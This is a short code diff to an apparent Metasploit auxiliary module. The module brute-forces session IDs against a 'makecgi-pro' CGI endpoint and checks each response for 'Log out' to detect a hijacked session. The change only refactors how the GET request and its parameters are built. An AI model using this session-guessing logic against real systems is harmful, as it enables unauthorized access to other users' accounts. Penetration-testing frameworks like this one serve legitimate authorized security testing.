@@ -38,9 +38,13 @@ class Metasploit3 < Msf::Auxiliary
       begin
         print_status("Trying session ID #{x.to_s}")
 
-        res = send_request_raw({
-          'uri'     => "/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}",
-          'method'  => 'GET'
+        res = send_request_cgi({
+          'uri'       => 'cgi-bin/makecgi-pro',
+          'method'    => 'GET',
+          'vars_get'  => {
+            'job'         => 'show_home',
+            'session_id'  => x.to_s
+          }
         }, 25)
 
         if (res and res.to_s =~ /Log out/)
